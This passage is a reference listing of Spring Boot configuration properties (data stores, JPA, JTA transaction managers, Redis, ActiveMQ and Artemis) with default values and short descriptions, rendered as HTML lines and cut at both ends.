FieldNamingStrategy to use.</span><br><span class="line">spring.data.mongodb.grid-fs-database= # GridFS database name.</span><br><span class="line">spring.data.mongodb.host= # Mongo server host. Cannot be set with URI.</span><br><span class="line">spring.data.mongodb.password= # Login password of the mongo server. Cannot be set with URI.</span><br><span class="line">spring.data.mongodb.port= # Mongo server port. Cannot be set with URI.</span><br><span class="line">spring.data.mongodb.repositories.type=auto # Type of Mongo repositories to enable.</span><br><span class="line">spring.data.mongodb.uri=mongodb://localhost/test # Mongo database URI. Cannot be set with host, port and credentials.</span><br><span class="line">spring.data.mongodb.username= # Login user of the mongo server. Cannot be set with URI.</span><br><span class="line"></span><br><span class="line"># DATA REDIS</span><br><span class="line">spring.data.redis.repositories.enabled=true # Whether to enable Redis repositories.</span><br><span class="line"></span><br><span class="line"># NEO4J (Neo4jProperties)</span><br><span class="line">spring.data.neo4j.auto-index=none # Auto index mode.</span><br><span class="line">spring.data.neo4j.embedded.enabled=true # Whether to enable embedded mode if the embedded driver is available.</span><br><span class="line">spring.data.neo4j.open-in-view=true # Register OpenSessionInViewInterceptor. Binds a Neo4j Session to the thread for the entire processing of the request.</span><br><span class="line">spring.data.neo4j.password= # Login password of the server.</span><br><span class="line">spring.data.neo4j.repositories.enabled=true # Whether to enable Neo4j repositories.</span><br><span class="line">spring.data.neo4j.uri= # URI used by the driver. Auto-detected by default.</span><br><span class="line">spring.data.neo4j.username= # Login user of the server.</span><br><span class="line"></span><br><span class="line"># DATA REST (RepositoryRestProperties)</span><br><span class="line">spring.data.rest.base-path= # Base path to be used by Spring Data REST to expose repository resources.</span><br><span class="line">spring.data.rest.default-media-type= # Content type to use as a default when none is specified.</span><br><span class="line">spring.data.rest.default-page-size= # Default size of pages.</span><br><span class="line">spring.data.rest.detection-strategy=default # Strategy to use to determine which repositories get exposed.</span><br><span class="line">spring.data.rest.enable-enum-translation= # Whether to enable enum value translation through the Spring Data REST default resource bundle.</span><br><span class="line">spring.data.rest.limit-param-name= # Name of the URL query string parameter that indicates how many results to return at once.</span><br><span class="line">spring.data.rest.max-page-size= # Maximum size of pages.</span><br><span class="line">spring.data.rest.page-param-name= # Name of the URL query string parameter that indicates what page to return.</span><br><span class="line">spring.data.rest.return-body-on-create= # Whether to return a response body after creating an entity.</span><br><span class="line">spring.data.rest.return-body-on-update= # Whether to return a response body after updating an entity.</span><br><span class="line">spring.data.rest.sort-param-name= # Name of the URL query string parameter that indicates what direction to sort results.</span><br><span class="line"></span><br><span class="line"># SOLR (SolrProperties)</span><br><span class="line">spring.data.solr.host=http://127.0.0.1:8983/solr # Solr host. Ignored if &quot;zk-host&quot; is set.</span><br><span class="line">spring.data.solr.repositories.enabled=true # Whether to enable Solr repositories.</span><br><span class="line">spring.data.solr.zk-host= # ZooKeeper host address in the form HOST:PORT.</span><br><span class="line"></span><br><span class="line"># DATA WEB (SpringDataWebProperties)</span><br><span class="line">spring.data.web.pageable.default-page-size=20 # Default page size.</span><br><span class="line">spring.data.web.pageable.max-page-size=2000 # Maximum page size to be accepted.</span><br><span class="line">spring.data.web.pageable.one-indexed-parameters=false # Whether to expose and assume 1-based page number indexes.</span><br><span class="line">spring.data.web.pageable.page-parameter=page # Page index parameter name.</span><br><span class="line">spring.data.web.pageable.prefix= # General prefix to be prepended to the page number and page size parameters.</span><br><span class="line">spring.data.web.pageable.qualifier-delimiter=_ # Delimiter to be used between the qualifier and the actual page number and size properties.</span><br><span class="line">spring.data.web.pageable.size-parameter=size # Page size parameter name.</span><br><span class="line">spring.data.web.sort.sort-parameter=sort # Sort parameter name.</span><br><span class="line"></span><br><span class="line"># DATASOURCE (DataSourceAutoConfiguration &amp; DataSourceProperties)</span><br><span class="line">spring.datasource.continue-on-error=false # Whether to stop if an error occurs while initializing the database.</span><br><span class="line">spring.datasource.data= # Data (DML) script resource references.</span><br><span class="line">spring.datasource.data-username= # Username of the database to execute DML scripts (if different).</span><br><span class="line">spring.datasource.data-password= # Password of the database to execute DML scripts (if different).</span><br><span class="line">spring.datasource.dbcp2.*= # Commons DBCP2 specific settings</span><br><span class="line">spring.datasource.driver-class-name= # Fully qualified name of the JDBC driver. Auto-detected based on the URL by default.</span><br><span class="line">spring.datasource.generate-unique-name=false # Whether to generate a random datasource name.</span><br><span class="line">spring.datasource.hikari.*= # Hikari specific settings</span><br><span class="line">spring.datasource.initialization-mode=embedded # Initialize the datasource with available DDL and DML scripts.</span><br><span class="line">spring.datasource.jmx-enabled=false # Whether to enable JMX support (if provided by the underlying pool).</span><br><span class="line">spring.datasource.jndi-name= # JNDI location of the datasource. Class, url, username &amp; password are ignored when set.</span><br><span class="line">spring.datasource.name= # Name of the datasource. Default to &quot;testdb&quot; when using an embedded database.</span><br><span class="line">spring.datasource.password= # Login password of the database.</span><br><span class="line">spring.datasource.platform=all # Platform to use in the DDL or DML scripts (such as schema-$&#123;platform&#125;.sql or data-$&#123;platform&#125;.sql).</span><br><span class="line">spring.datasource.schema= # Schema (DDL) script resource references.</span><br><span class="line">spring.datasource.schema-username= # Username of the database to execute DDL scripts (if different).</span><br><span class="line">spring.datasource.schema-password= # Password of the database to execute DDL scripts (if different).</span><br><span class="line">spring.datasource.separator=; # Statement separator in SQL initialization scripts.</span><br><span class="line">spring.datasource.sql-script-encoding= # SQL scripts encoding.</span><br><span class="line">spring.datasource.tomcat.*= # Tomcat datasource specific settings</span><br><span class="line">spring.datasource.type= # Fully qualified name of the connection pool implementation to use. By default, it is auto-detected from the classpath.</span><br><span class="line">spring.datasource.url= # JDBC URL of the database.</span><br><span class="line">spring.datasource.username= # Login username of the database.</span><br><span class="line">spring.datasource.xa.data-source-class-name= # XA datasource fully qualified name.</span><br><span class="line">spring.datasource.xa.properties= # Properties to pass to the XA data source.</span><br><span class="line"></span><br><span class="line"># JEST (Elasticsearch HTTP client) (JestProperties)</span><br><span class="line">spring.elasticsearch.jest.connection-timeout=3s # Connection timeout.</span><br><span class="line">spring.elasticsearch.jest.multi-threaded=true # Whether to enable connection requests from multiple execution threads.</span><br><span class="line">spring.elasticsearch.jest.password= # Login password.</span><br><span class="line">spring.elasticsearch.jest.proxy.host= # Proxy host the HTTP client should use.</span><br><span class="line">spring.elasticsearch.jest.proxy.port= # Proxy port the HTTP client should use.</span><br><span class="line">spring.elasticsearch.jest.read-timeout=3s # Read timeout.</span><br><span class="line">spring.elasticsearch.jest.uris=http://localhost:9200 # Comma-separated list of the Elasticsearch instances to use.</span><br><span class="line">spring.elasticsearch.jest.username= # Login username.</span><br><span class="line"></span><br><span class="line"># H2 Web Console (H2ConsoleProperties)</span><br><span class="line">spring.h2.console.enabled=false # Whether to enable the console.</span><br><span class="line">spring.h2.console.path=/h2-console # Path at which the console is available.</span><br><span class="line">spring.h2.console.settings.trace=false # Whether to enable trace output.</span><br><span class="line">spring.h2.console.settings.web-allow-others=false # Whether to enable remote access.</span><br><span class="line"></span><br><span class="line"># InfluxDB (InfluxDbProperties)</span><br><span class="line">spring.influx.password= # Login password.</span><br><span class="line">spring.influx.url= # URL of the InfluxDB instance to which to connect.</span><br><span class="line">spring.influx.user= # Login user.</span><br><span class="line"></span><br><span class="line"># JOOQ (JooqProperties)</span><br><span class="line">spring.jooq.sql-dialect= # SQL dialect to use. Auto-detected by default.</span><br><span class="line"></span><br><span class="line"># JDBC (JdbcProperties)</span><br><span class="line">spring.jdbc.template.fetch-size=-1 # Number of rows that should be fetched from the database when more rows are needed.</span><br><span class="line">spring.jdbc.template.max-rows=-1 # Maximum number of rows.</span><br><span class="line">spring.jdbc.template.query-timeout= # Query timeout. Default is to use the JDBC driver&apos;s default configuration. If a duration suffix is not specified, seconds will be used.</span><br><span class="line"></span><br><span class="line"># JPA (JpaBaseConfiguration, HibernateJpaAutoConfiguration)</span><br><span class="line">spring.data.jpa.repositories.enabled=true # Whether to enable JPA repositories.</span><br><span class="line">spring.jpa.database= # Target database to operate on, auto-detected by default. Can be alternatively set using the &quot;databasePlatform&quot; property.</span><br><span class="line">spring.jpa.database-platform= # Name of the target database to operate on, auto-detected by default. Can be alternatively set using the &quot;Database&quot; enum.</span><br><span class="line">spring.jpa.generate-ddl=false # Whether to initialize the schema on startup.</span><br><span class="line">spring.jpa.hibernate.ddl-auto= # DDL mode. This is actually a shortcut for the &quot;hibernate.hbm2ddl.auto&quot; property. Defaults to &quot;create-drop&quot; when using an embedded database and no schema manager was detected. Otherwise, defaults to &quot;none&quot;.</span><br><span class="line">spring.jpa.hibernate.naming.implicit-strategy= # Fully qualified name of the implicit naming strategy.</span><br><span class="line">spring.jpa.hibernate.naming.physical-strategy= # Fully qualified name of the physical naming strategy.</span><br><span class="line">spring.jpa.hibernate.use-new-id-generator-mappings= # Whether to use Hibernate&apos;s newer IdentifierGenerator for AUTO, TABLE and SEQUENCE.</span><br><span class="line">spring.jpa.mapping-resources= # Mapping resources (equivalent to &quot;mapping-file&quot; entries in persistence.xml).</span><br><span class="line">spring.jpa.open-in-view=true # Register OpenEntityManagerInViewInterceptor. Binds a JPA EntityManager to the thread for the entire processing of the request.</span><br><span class="line">spring.jpa.properties.*= # Additional native properties to set on the JPA provider.</span><br><span class="line">spring.jpa.show-sql=false # Whether to enable logging of SQL statements.</span><br><span class="line"></span><br><span class="line"># JTA (JtaAutoConfiguration)</span><br><span class="line">spring.jta.enabled=true # Whether to enable JTA support.</span><br><span class="line">spring.jta.log-dir= # Transaction logs directory.</span><br><span class="line">spring.jta.transaction-manager-id= # Transaction manager unique identifier.</span><br><span class="line"></span><br><span class="line"># ATOMIKOS (AtomikosProperties)</span><br><span class="line">spring.jta.atomikos.connectionfactory.borrow-connection-timeout=30 # Timeout, in seconds, for borrowing connections from the pool.</span><br><span class="line">spring.jta.atomikos.connectionfactory.ignore-session-transacted-flag=true # Whether to ignore the transacted flag when creating session.</span><br><span class="line">spring.jta.atomikos.connectionfactory.local-transaction-mode=false # Whether local transactions are desired.</span><br><span class="line">spring.jta.atomikos.connectionfactory.maintenance-interval=60 # The time, in seconds, between runs of the pool&apos;s maintenance thread.</span><br><span class="line">spring.jta.atomikos.connectionfactory.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.</span><br><span class="line">spring.jta.atomikos.connectionfactory.max-lifetime=0 # The time, in seconds, that a connection can be pooled for before being destroyed. 0 denotes no limit.</span><br><span class="line">spring.jta.atomikos.connectionfactory.max-pool-size=1 # The maximum size of the pool.</span><br><span class="line">spring.jta.atomikos.connectionfactory.min-pool-size=1 # The minimum size of the pool.</span><br><span class="line">spring.jta.atomikos.connectionfactory.reap-timeout=0 # The reap timeout, in seconds, for borrowed connections. 0 denotes no limit.</span><br><span class="line">spring.jta.atomikos.connectionfactory.unique-resource-name=jmsConnectionFactory # The unique name used to identify the resource during recovery.</span><br><span class="line">spring.jta.atomikos.connectionfactory.xa-connection-factory-class-name= # Vendor-specific implementation of XAConnectionFactory.</span><br><span class="line">spring.jta.atomikos.connectionfactory.xa-properties= # Vendor-specific XA properties.</span><br><span class="line">spring.jta.atomikos.datasource.borrow-connection-timeout=30 # Timeout, in seconds, for borrowing connections from the pool.</span><br><span class="line">spring.jta.atomikos.datasource.concurrent-connection-validation= # Whether to use concurrent connection validation.</span><br><span class="line">spring.jta.atomikos.datasource.default-isolation-level= # Default isolation level of connections provided by the pool.</span><br><span class="line">spring.jta.atomikos.datasource.login-timeout= # Timeout, in seconds, for establishing a database connection.</span><br><span class="line">spring.jta.atomikos.datasource.maintenance-interval=60 # The time, in seconds, between runs of the pool&apos;s maintenance thread.</span><br><span class="line">spring.jta.atomikos.datasource.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.</span><br><span class="line">spring.jta.atomikos.datasource.max-lifetime=0 # The time, in seconds, that a connection can be pooled for before being destroyed. 0 denotes no limit.</span><br><span class="line">spring.jta.atomikos.datasource.max-pool-size=1 # The maximum size of the pool.</span><br><span class="line">spring.jta.atomikos.datasource.min-pool-size=1 # The minimum size of the pool.</span><br><span class="line">spring.jta.atomikos.datasource.reap-timeout=0 # The reap timeout, in seconds, for borrowed connections. 0 denotes no limit.</span><br><span class="line">spring.jta.atomikos.datasource.test-query= # SQL query or statement used to validate a connection before returning it.</span><br><span class="line">spring.jta.atomikos.datasource.unique-resource-name=dataSource # The unique name used to identify the resource during recovery.</span><br><span class="line">spring.jta.atomikos.datasource.xa-data-source-class-name= # Vendor-specific implementation of XAConnectionFactory.</span><br><span class="line">spring.jta.atomikos.datasource.xa-properties= # Vendor-specific XA properties.</span><br><span class="line">spring.jta.atomikos.properties.allow-sub-transactions=true # Specify whether sub-transactions are allowed.</span><br><span class="line">spring.jta.atomikos.properties.checkpoint-interval=500 # Interval between checkpoints, expressed as the number of log writes between two checkpoint.</span><br><span class="line">spring.jta.atomikos.properties.default-jta-timeout=10000ms # Default timeout for JTA transactions.</span><br><span class="line">spring.jta.atomikos.properties.default-max-wait-time-on-shutdown=9223372036854775807 # How long should normal shutdown (no-force) wait for transactions to complete.</span><br><span class="line">spring.jta.atomikos.properties.enable-logging=true # Whether to enable disk logging.</span><br><span class="line">spring.jta.atomikos.properties.force-shutdown-on-vm-exit=false # Whether a VM shutdown should trigger forced shutdown of the transaction core.</span><br><span class="line">spring.jta.atomikos.properties.log-base-dir= # Directory in which the log files should be stored.</span><br><span class="line">spring.jta.atomikos.properties.log-base-name=tmlog # Transactions log file base name.</span><br><span class="line">spring.jta.atomikos.properties.max-actives=50 # Maximum number of active transactions.</span><br><span class="line">spring.jta.atomikos.properties.max-timeout=300000ms # Maximum timeout that can be allowed for transactions.</span><br><span class="line">spring.jta.atomikos.properties.recovery.delay=10000ms # Delay between two recovery scans.</span><br><span class="line">spring.jta.atomikos.properties.recovery.forget-orphaned-log-entries-delay=86400000ms # Delay after which recovery can cleanup pending (&apos;orphaned&apos;) log entries.</span><br><span class="line">spring.jta.atomikos.properties.recovery.max-retries=5 # Number of retry attempts to commit the transaction before throwing an exception.</span><br><span class="line">spring.jta.atomikos.properties.recovery.retry-interval=10000ms # Delay between retry attempts.</span><br><span class="line">spring.jta.atomikos.properties.serial-jta-transactions=true # Whether sub-transactions should be joined when possible.</span><br><span class="line">spring.jta.atomikos.properties.service= # Transaction manager implementation that should be started.</span><br><span class="line">spring.jta.atomikos.properties.threaded-two-phase-commit=false # Whether to use different (and concurrent) threads for two-phase commit on the participating resources.</span><br><span class="line">spring.jta.atomikos.properties.transaction-manager-unique-name= # The transaction manager&apos;s unique name.</span><br><span class="line"></span><br><span class="line"># BITRONIX</span><br><span class="line">spring.jta.bitronix.connectionfactory.acquire-increment=1 # Number of connections to create when growing the pool.</span><br><span class="line">spring.jta.bitronix.connectionfactory.acquisition-interval=1 # Time, in seconds, to wait before trying to acquire a connection again after an invalid connection was acquired.</span><br><span class="line">spring.jta.bitronix.connectionfactory.acquisition-timeout=30 # Timeout, in seconds, for acquiring connections from the pool.</span><br><span class="line">spring.jta.bitronix.connectionfactory.allow-local-transactions=true # Whether the transaction manager should allow mixing XA and non-XA transactions.</span><br><span class="line">spring.jta.bitronix.connectionfactory.apply-transaction-timeout=false # Whether the transaction timeout should be set on the XAResource when it is enlisted.</span><br><span class="line">spring.jta.bitronix.connectionfactory.automatic-enlisting-enabled=true # Whether resources should be enlisted and delisted automatically.</span><br><span class="line">spring.jta.bitronix.connectionfactory.cache-producers-consumers=true # Whether producers and consumers should be cached.</span><br><span class="line">spring.jta.bitronix.connectionfactory.class-name= # Underlying implementation class name of the XA resource.</span><br><span class="line">spring.jta.bitronix.connectionfactory.defer-connection-release=true # Whether the provider can run many transactions on the same connection and supports transaction interleaving.</span><br><span class="line">spring.jta.bitronix.connectionfactory.disabled= # Whether this resource is disabled, meaning it&apos;s temporarily forbidden to acquire a connection from its pool.</span><br><span class="line">spring.jta.bitronix.connectionfactory.driver-properties= # Properties that should be set on the underlying implementation.</span><br><span class="line">spring.jta.bitronix.connectionfactory.failed= # Mark this resource producer as failed.</span><br><span class="line">spring.jta.bitronix.connectionfactory.ignore-recovery-failures=false # Whether recovery failures should be ignored.</span><br><span class="line">spring.jta.bitronix.connectionfactory.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.</span><br><span class="line">spring.jta.bitronix.connectionfactory.max-pool-size=10 # The maximum size of the pool. 0 denotes no limit.</span><br><span class="line">spring.jta.bitronix.connectionfactory.min-pool-size=0 # The minimum size of the pool.</span><br><span class="line">spring.jta.bitronix.connectionfactory.password= # The password to use to connect to the JMS provider.</span><br><span class="line">spring.jta.bitronix.connectionfactory.share-transaction-connections=false #  Whether connections in the ACCESSIBLE state can be shared within the context of a transaction.</span><br><span class="line">spring.jta.bitronix.connectionfactory.test-connections=true # Whether connections should be tested when acquired from the pool.</span><br><span class="line">spring.jta.bitronix.connectionfactory.two-pc-ordering-position=1 # The position that this resource should take during two-phase commit (always first is Integer.MIN_VALUE, always last is Integer.MAX_VALUE).</span><br><span class="line">spring.jta.bitronix.connectionfactory.unique-name=jmsConnectionFactory # The unique name used to identify the resource during recovery.</span><br><span class="line">spring.jta.bitronix.connectionfactory.use-tm-join=true # Whether TMJOIN should be used when starting XAResources.</span><br><span class="line">spring.jta.bitronix.connectionfactory.user= # The user to use to connect to the JMS provider.</span><br><span class="line">spring.jta.bitronix.datasource.acquire-increment=1 # Number of connections to create when growing the pool.</span><br><span class="line">spring.jta.bitronix.datasource.acquisition-interval=1 # Time, in seconds, to wait before trying to acquire a connection again after an invalid connection was acquired.</span><br><span class="line">spring.jta.bitronix.datasource.acquisition-timeout=30 # Timeout, in seconds, for acquiring connections from the pool.</span><br><span class="line">spring.jta.bitronix.datasource.allow-local-transactions=true # Whether the transaction manager should allow mixing XA and non-XA transactions.</span><br><span class="line">spring.jta.bitronix.datasource.apply-transaction-timeout=false # Whether the transaction timeout should be set on the XAResource when it is enlisted.</span><br><span class="line">spring.jta.bitronix.datasource.automatic-enlisting-enabled=true # Whether resources should be enlisted and delisted automatically.</span><br><span class="line">spring.jta.bitronix.datasource.class-name= # Underlying implementation class name of the XA resource.</span><br><span class="line">spring.jta.bitronix.datasource.cursor-holdability= # The default cursor holdability for connections.</span><br><span class="line">spring.jta.bitronix.datasource.defer-connection-release=true # Whether the database can run many transactions on the same connection and supports transaction interleaving.</span><br><span class="line">spring.jta.bitronix.datasource.disabled= # Whether this resource is disabled, meaning it&apos;s temporarily forbidden to acquire a connection from its pool.</span><br><span class="line">spring.jta.bitronix.datasource.driver-properties= # Properties that should be set on the underlying implementation.</span><br><span class="line">spring.jta.bitronix.datasource.enable-jdbc4-connection-test= # Whether Connection.isValid() is called when acquiring a connection from the pool.</span><br><span class="line">spring.jta.bitronix.datasource.failed= # Mark this resource producer as failed.</span><br><span class="line">spring.jta.bitronix.datasource.ignore-recovery-failures=false # Whether recovery failures should be ignored.</span><br><span class="line">spring.jta.bitronix.datasource.isolation-level= # The default isolation level for connections.</span><br><span class="line">spring.jta.bitronix.datasource.local-auto-commit= # The default auto-commit mode for local transactions.</span><br><span class="line">spring.jta.bitronix.datasource.login-timeout= # Timeout, in seconds, for establishing a database connection.</span><br><span class="line">spring.jta.bitronix.datasource.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.</span><br><span class="line">spring.jta.bitronix.datasource.max-pool-size=10 # The maximum size of the pool. 0 denotes no limit.</span><br><span class="line">spring.jta.bitronix.datasource.min-pool-size=0 # The minimum size of the pool.</span><br><span class="line">spring.jta.bitronix.datasource.prepared-statement-cache-size=0 # The target size of the prepared statement cache. 0 disables the cache.</span><br><span class="line">spring.jta.bitronix.datasource.share-transaction-connections=false #  Whether connections in the ACCESSIBLE state can be shared within the context of a transaction.</span><br><span class="line">spring.jta.bitronix.datasource.test-query= # SQL query or statement used to validate a connection before returning it.</span><br><span class="line">spring.jta.bitronix.datasource.two-pc-ordering-position=1 # The position that this resource should take during two-phase commit (always first is Integer.MIN_VALUE, and always last is Integer.MAX_VALUE).</span><br><span class="line">spring.jta.bitronix.datasource.unique-name=dataSource # The unique name used to identify the resource during recovery.</span><br><span class="line">spring.jta.bitronix.datasource.use-tm-join=true # Whether TMJOIN should be used when starting XAResources.</span><br><span class="line">spring.jta.bitronix.properties.allow-multiple-lrc=false # Whether to allow multiple LRC resources to be enlisted into the same transaction.</span><br><span class="line">spring.jta.bitronix.properties.asynchronous2-pc=false # Whether to enable asynchronously execution of two phase commit.</span><br><span class="line">spring.jta.bitronix.properties.background-recovery-interval-seconds=60 # Interval in seconds at which to run the recovery process in the background.</span><br><span class="line">spring.jta.bitronix.properties.current-node-only-recovery=true # Whether to recover only the current node.</span><br><span class="line">spring.jta.bitronix.properties.debug-zero-resource-transaction=false # Whether to log the creation and commit call stacks of transactions executed without a single enlisted resource.</span><br><span class="line">spring.jta.bitronix.properties.default-transaction-timeout=60 # Default transaction timeout, in seconds.</span><br><span class="line">spring.jta.bitronix.properties.disable-jmx=false # Whether to enable JMX support.</span><br><span class="line">spring.jta.bitronix.properties.exception-analyzer= # Set the fully qualified name of the exception analyzer implementation to use.</span><br><span class="line">spring.jta.bitronix.properties.filter-log-status=false # Whether to enable filtering of logs so that only mandatory logs are written.</span><br><span class="line">spring.jta.bitronix.properties.force-batching-enabled=true #  Whether disk forces are batched.</span><br><span class="line">spring.jta.bitronix.properties.forced-write-enabled=true # Whether logs are forced to disk.</span><br><span class="line">spring.jta.bitronix.properties.graceful-shutdown-interval=60 # Maximum amount of seconds the TM waits for transactions to get done before aborting them at shutdown time.</span><br><span class="line">spring.jta.bitronix.properties.jndi-transaction-synchronization-registry-name= # JNDI name of the TransactionSynchronizationRegistry.</span><br><span class="line">spring.jta.bitronix.properties.jndi-user-transaction-name= # JNDI name of the UserTransaction.</span><br><span class="line">spring.jta.bitronix.properties.journal=disk # Name of the journal. Can be &apos;disk&apos;, &apos;null&apos;, or a class name.</span><br><span class="line">spring.jta.bitronix.properties.log-part1-filename=btm1.tlog # Name of the first fragment of the journal.</span><br><span class="line">spring.jta.bitronix.properties.log-part2-filename=btm2.tlog # Name of the second fragment of the journal.</span><br><span class="line">spring.jta.bitronix.properties.max-log-size-in-mb=2 # Maximum size in megabytes of the journal fragments.</span><br><span class="line">spring.jta.bitronix.properties.resource-configuration-filename= # ResourceLoader configuration file name.</span><br><span class="line">spring.jta.bitronix.properties.server-id= # ASCII ID that must uniquely identify this TM instance. Defaults to the machine&apos;s IP address.</span><br><span class="line">spring.jta.bitronix.properties.skip-corrupted-logs=false # Skip corrupted transactions log entries.</span><br><span class="line">spring.jta.bitronix.properties.warn-about-zero-resource-transaction=true # Whether to log a warning for transactions executed without a single enlisted resource.</span><br><span class="line"></span><br><span class="line"># NARAYANA (NarayanaProperties)</span><br><span class="line">spring.jta.narayana.default-timeout=60s # Transaction timeout. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.jta.narayana.expiry-scanners=com.arjuna.ats.internal.arjuna.recovery.ExpiredTransactionStatusManagerScanner # Comma-separated list of expiry scanners.</span><br><span class="line">spring.jta.narayana.log-dir= # Transaction object store directory.</span><br><span class="line">spring.jta.narayana.one-phase-commit=true # Whether to enable one phase commit optimization.</span><br><span class="line">spring.jta.narayana.periodic-recovery-period=120s # Interval in which periodic recovery scans are performed. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.jta.narayana.recovery-backoff-period=10s # Back off period between first and second phases of the recovery scan. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.jta.narayana.recovery-db-pass= # Database password to be used by the recovery manager.</span><br><span class="line">spring.jta.narayana.recovery-db-user= # Database username to be used by the recovery manager.</span><br><span class="line">spring.jta.narayana.recovery-jms-pass= # JMS password to be used by the recovery manager.</span><br><span class="line">spring.jta.narayana.recovery-jms-user= # JMS username to be used by the recovery manager.</span><br><span class="line">spring.jta.narayana.recovery-modules= # Comma-separated list of recovery modules.</span><br><span class="line">spring.jta.narayana.transaction-manager-id=1 # Unique transaction manager id.</span><br><span class="line">spring.jta.narayana.xa-resource-orphan-filters= # Comma-separated list of orphan filters.</span><br><span class="line"></span><br><span class="line"># EMBEDDED MONGODB (EmbeddedMongoProperties)</span><br><span class="line">spring.mongodb.embedded.features=sync_delay # Comma-separated list of features to enable.</span><br><span class="line">spring.mongodb.embedded.storage.database-dir= # Directory used for data storage.</span><br><span class="line">spring.mongodb.embedded.storage.oplog-size= # Maximum size of the oplog, in megabytes.</span><br><span class="line">spring.mongodb.embedded.storage.repl-set-name= # Name of the replica set.</span><br><span class="line">spring.mongodb.embedded.version=3.2.2 # Version of Mongo to use.</span><br><span class="line"></span><br><span class="line"># REDIS (RedisProperties)</span><br><span class="line">spring.redis.cluster.max-redirects= # Maximum number of redirects to follow when executing commands across the cluster.</span><br><span class="line">spring.redis.cluster.nodes= # Comma-separated list of &quot;host:port&quot; pairs to bootstrap from.</span><br><span class="line">spring.redis.database=0 # Database index used by the connection factory.</span><br><span class="line">spring.redis.url= # Connection URL. Overrides host, port, and password. User is ignored. Example: redis://user:password@example.com:6379</span><br><span class="line">spring.redis.host=localhost # Redis server host.</span><br><span class="line">spring.redis.jedis.pool.max-active=8 # Maximum number of connections that can be allocated by the pool at a given time. Use a negative value for no limit.</span><br><span class="line">spring.redis.jedis.pool.max-idle=8 # Maximum number of &quot;idle&quot; connections in the pool. Use a negative value to indicate an unlimited number of idle connections.</span><br><span class="line">spring.redis.jedis.pool.max-wait=-1ms # Maximum amount of time a connection allocation should block before throwing an exception when the pool is exhausted. Use a negative value to block indefinitely.</span><br><span class="line">spring.redis.jedis.pool.min-idle=0 # Target for the minimum number of idle connections to maintain in the pool. This setting only has an effect if it is positive.</span><br><span class="line">spring.redis.lettuce.pool.max-active=8 # Maximum number of connections that can be allocated by the pool at a given time. Use a negative value for no limit.</span><br><span class="line">spring.redis.lettuce.pool.max-idle=8 # Maximum number of &quot;idle&quot; connections in the pool. Use a negative value to indicate an unlimited number of idle connections.</span><br><span class="line">spring.redis.lettuce.pool.max-wait=-1ms # Maximum amount of time a connection allocation should block before throwing an exception when the pool is exhausted. Use a negative value to block indefinitely.</span><br><span class="line">spring.redis.lettuce.pool.min-idle=0 # Target for the minimum number of idle connections to maintain in the pool. This setting only has an effect if it is positive.</span><br><span class="line">spring.redis.lettuce.shutdown-timeout=100ms # Shutdown timeout.</span><br><span class="line">spring.redis.password= # Login password of the redis server.</span><br><span class="line">spring.redis.port=6379 # Redis server port.</span><br><span class="line">spring.redis.sentinel.master= # Name of the Redis server.</span><br><span class="line">spring.redis.sentinel.nodes= # Comma-separated list of &quot;host:port&quot; pairs.</span><br><span class="line">spring.redis.ssl=false # Whether to enable SSL support.</span><br><span class="line">spring.redis.timeout= # Connection timeout.</span><br><span class="line"></span><br><span class="line"># TRANSACTION (TransactionProperties)</span><br><span class="line">spring.transaction.default-timeout= # Default transaction timeout. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.transaction.rollback-on-commit-failure= # Whether to roll back on commit failures.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># INTEGRATION PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"></span><br><span class="line"># ACTIVEMQ (ActiveMQProperties)</span><br><span class="line">spring.activemq.broker-url= # URL of the ActiveMQ broker. Auto-generated by default.</span><br><span class="line">spring.activemq.close-timeout=15s # Time to wait before considering a close complete.</span><br><span class="line">spring.activemq.in-memory=true # Whether the default broker URL should be in memory. Ignored if an explicit broker has been specified.</span><br><span class="line">spring.activemq.non-blocking-redelivery=false # Whether to stop message delivery before re-delivering messages from a rolled back transaction. This implies that message order is not preserved when this is enabled.</span><br><span class="line">spring.activemq.password= # Login password of the broker.</span><br><span class="line">spring.activemq.send-timeout=0ms # Time to wait on message sends for a response. Set it to 0 to wait forever.</span><br><span class="line">spring.activemq.user= # Login user of the broker.</span><br><span class="line">spring.activemq.packages.trust-all= # Whether to trust all packages.</span><br><span class="line">spring.activemq.packages.trusted= # Comma-separated list of specific packages to trust (when not trusting all packages).</span><br><span class="line">spring.activemq.pool.block-if-full=true # Whether to block when a connection is requested and the pool is full. Set it to false to throw a &quot;JMSException&quot; instead.</span><br><span class="line">spring.activemq.pool.block-if-full-timeout=-1ms # Blocking period before throwing an exception if the pool is still full.</span><br><span class="line">spring.activemq.pool.create-connection-on-startup=true # Whether to create a connection on startup. Can be used to warm up the pool on startup.</span><br><span class="line">spring.activemq.pool.enabled=false # Whether a PooledConnectionFactory should be created, instead of a regular ConnectionFactory.</span><br><span class="line">spring.activemq.pool.expiry-timeout=0ms # Connection expiration timeout.</span><br><span class="line">spring.activemq.pool.idle-timeout=30s # Connection idle timeout.</span><br><span class="line">spring.activemq.pool.max-connections=1 # Maximum number of pooled connections.</span><br><span class="line">spring.activemq.pool.maximum-active-session-per-connection=500 # Maximum number of active sessions per connection.</span><br><span class="line">spring.activemq.pool.reconnect-on-exception=true # Reset the connection when a &quot;JMSException&quot; occurs.</span><br><span class="line">spring.activemq.pool.time-between-expiration-check=-1ms # Time to sleep between runs of the idle connection eviction thread. When negative, no idle connection eviction thread runs.</span><br><span class="line">spring.activemq.pool.use-anonymous-producers=true # Whether to use only one anonymous &quot;MessageProducer&quot; instance. Set it to false to create one &quot;MessageProducer&quot; every time one is required.</span><br><span class="line"></span><br><span class="line"># ARTEMIS (ArtemisProperties)</span><br><span class="line">spring.artemis.embedded.cluster-password= # Cluster password. Randomly generated on startup by default.</span><br><span class="line">spring.artemis.embedded.data-directory= # Journal file directory. Not necessary if persistence is turned off.</span><br><span class="line">spring.artemis.embedded.enabled=true # Whether to enable embedded mode if the Artemis server APIs are available.</span><br><span class="line">spring.artemis.embedded.persistent=false # Whether to enable persistent store.</span><br><span class="line">spring.artemis.embedded.queues= # Comma-separated list of queues to create on startup.</span><br><span 